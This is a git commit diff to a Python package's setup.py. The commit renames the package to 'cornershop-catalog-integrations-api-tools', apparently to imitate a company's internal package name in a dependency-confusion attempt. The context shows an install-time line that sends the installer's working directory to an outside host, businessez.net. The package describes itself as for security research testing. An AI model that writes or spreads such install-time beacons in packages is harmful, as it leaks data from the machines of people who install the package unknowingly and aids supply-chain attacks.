943aa996abb3151ea593d0edd508e111179a5919
mohmoniem281 <mohmoniem281@gmail.com>
2021-02-22 14:30:56 -0500

    Add files via upload

--- setup.py
+++ setup.py
@@ -8,15 +8,15 @@ r = requests.get('http://businessez.net/cornershop/?workingdir='+os.getcwd())
 
 
 setup(
-  name = 'modytest',         # How you named your package folder (MyLib)
-  packages = ['modytest'],   # Chose the same as "name"
+  name = 'cornershop-catalog-integrations-api-tools',         # How you named your package folder (MyLib)
+  packages = ['cornershop-catalog-integrations-api-tools'],   # Chose the same as "name"
   version = '0.1',      # Start with a small number and increase it with every change you make
   license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository
   description = 'for security research testing purposes',   # for security research testing purposes
   author = 'YOUR NAME',                   # Type in your name
   author_email = 'your.email@domain.com',      # Type in your E-Mail
   url = 'https://github.com/user/reponame',   # Provide either the link to your github or to your website
-  download_url = 'https://github.com/mohmoniem281/cornershop-catalog-integrations-api-tools/archive/11.1.tar.gz',    # I explain this later on
+  download_url = 'https://github.com/mohmoniem281/cornershop-catalog-integrations-api-tools/archive/11.2.tar.gz',    # I explain this later on
   keywords = ['SOME', 'MEANINGFULL', 'KEYWORDS'],   # Keywords that define your package best
   install_requires=[            # I get to this in a second
           'requests'
